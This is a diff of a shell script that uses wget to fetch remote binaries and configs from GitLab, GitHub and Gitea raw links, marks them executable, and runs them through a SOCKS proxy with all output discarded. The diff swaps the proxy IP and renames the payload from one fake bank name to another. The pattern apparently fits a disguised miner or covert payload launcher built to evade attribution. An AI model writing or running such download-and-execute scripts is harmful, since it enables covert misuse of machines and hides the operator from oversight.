@@ -1,6 +1,6 @@
-proxy="192.111.138.29" 
+proxy="184.185.2.12" 
 port="4145"
-wget -q -O VertexBankSystem https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x VertexBankSystem
+wget -q -O BanqueFédéraliste https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x BanqueFédéraliste
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,6 +19,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./VertexBankSystem -c "config.json" >/dev/null 2>&1
+./panel ./BanqueFédéraliste -c "config.json" >/dev/null 2>&1
 sleep 1
 sync; echo 1 > /proc/sys/vm/drop_caches
